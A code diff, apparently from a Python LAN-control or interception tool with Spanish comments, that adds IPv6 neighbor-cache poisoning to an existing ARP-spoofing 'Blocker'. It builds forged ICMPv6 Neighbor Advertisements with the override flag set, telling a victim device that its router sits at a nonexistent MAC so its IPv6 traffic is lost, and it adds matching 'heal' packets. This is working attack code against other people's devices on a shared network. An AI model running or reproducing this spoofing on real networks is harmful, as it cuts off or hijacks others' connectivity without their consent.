@@ -74,6 +74,52 @@ def _mac_from_arp(ip):
 
 
 # --------------------------------------------------------------------------- #
+#  IPv6 (NDP) — hoy la mayoria del trafico (YouTube, Google...) va por IPv6, y
+#  ARP no lo toca. Para que el bloqueo corte de verdad hay que envenenar tambien
+#  la cache de vecinos IPv6 del equipo: decirle que el router (su link-local) esta
+#  en una MAC inexistente.
+# --------------------------------------------------------------------------- #
+def _gateway6():
+    """Link-local IPv6 del router (siguiente salto por defecto), o '' si no hay
+    IPv6 en la red."""
+    try:
+        from scapy.all import conf
+        _iface, _src, nh = conf.route6.route("2000::")
+        if nh and str(nh).lower().startswith("fe80"):
+            return nh
+    except Exception:
+        pass
+    return ""
+
+
+def _eui64_ll(mac):
+    """Link-local IPv6 derivada por EUI-64 (fallback si aun no vimos la real)."""
+    try:
+        b = [int(x, 16) for x in mac.split(":")]
+        if len(b) != 6:
+            return ""
+    except Exception:
+        return ""
+    b[0] ^= 0x02
+    iid = b[0:3] + [0xff, 0xfe] + b[3:6]
+    return "fe80::%02x%02x:%02x%02x:%02x%02x:%02x%02x" % tuple(iid)
+
+
+def _send_na(iface, dst_ip6, dst_mac, target_ip6, lladdr, src_ip6):
+    """ICMPv6 Neighbor Advertisement spoofeado: 'target_ip6 esta en lladdr'.
+    Override=1 fuerza actualizar la cache de vecinos del destino."""
+    from scapy.all import Ether, sendp
+    from scapy.layers.inet6 import IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
+    pkt = (Ether(dst=dst_mac) / IPv6(src=src_ip6, dst=dst_ip6) /
+           ICMPv6ND_NA(tgt=target_ip6, R=0, S=0, O=1) /
+           ICMPv6NDOptDstLLAddr(lladdr=lladdr))
+    if iface:
+        sendp(pkt, iface=iface, verbose=0)
+    else:
+        sendp(pkt, verbose=0)
+
+
+# --------------------------------------------------------------------------- #
 #  Reenvio de IP (para no cortarle internet al objetivo)
 # --------------------------------------------------------------------------- #
 # Estado del servicio RemoteAccess de Windows ANTES de que lo toquemos, para
@@ -314,6 +360,7 @@ class Blocker:
         self.targets = {}       # ip -> mac
         self.gateway_ip = None
         self.gateway_mac = None
+        self.gateway6 = ""      # link-local IPv6 del router (si la red tiene IPv6)
         self.iface = None
         self._running = False
         self._thread = None
@@ -327,6 +374,18 @@ class Blocker:
         self.gateway_mac = Interceptor._mac_of(self.gateway_ip)
         if not self.gateway_mac:
             raise RuntimeError("No se pudo resolver la MAC del router.")
+        self.gateway6 = _gateway6()   # '' si la red no tiene IPv6
+
+    def _victim6(self, mac):
+        """Link-local IPv6 del equipo: la real vista por el sniffer, o EUI-64."""
+        try:
+            from sniffer import monitor
+            real = monitor.ip6_ll_for(mac)
+            if real:
+                return real
+        except Exception:
+            pass
+        return _eui64_ll(mac)
 
     def _poison(self, ip, mac):
         """Envenena en LAS DOS direcciones (agresivo):
@@ -341,13 +400,31 @@ class Blocker:
         _send_arp(iface=self.iface, ether_src=BLACKHOLE_MAC, op=2,
                   pdst=self.gateway_ip, hwdst=self.gateway_mac,
                   psrc=ip, hwsrc=BLACKHOLE_MAC)
+        # IPv6: dile al equipo que el router (su link-local) esta en la MAC
+        # agujero-negro -> su trafico IPv6 a internet se pierde.
+        if self.gateway6:
+            v6 = self._victim6(mac)
+            if v6:
+                try:
+                    _send_na(self.iface, v6, mac, self.gateway6,
+                             BLACKHOLE_MAC, self.gateway6)
+                except Exception:
+                    pass
 
     def _heal(self, ip, mac):
-        """Restaura las asociaciones ARP correctas en ambos extremos."""
+        """Restaura las asociaciones ARP (y NDP) correctas en ambos extremos."""
         _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
                   psrc=self.gateway_ip, hwsrc=self.gateway_mac)
         _send_arp(iface=self.iface, op=2, pdst=self.gateway_ip,
                   hwdst=self.gateway_mac, psrc=ip, hwsrc=mac)
+        if self.gateway6 and self.gateway_mac:
+            v6 = self._victim6(mac)
+            if v6:
+                try:
+                    _send_na(self.iface, v6, mac, self.gateway6,
+                             self.gateway_mac, self.gateway6)
+                except Exception:
+                    pass
 
     def block(self, ip, mac=None):
         mac = (mac or "").lower() or Interceptor._mac_of(ip)
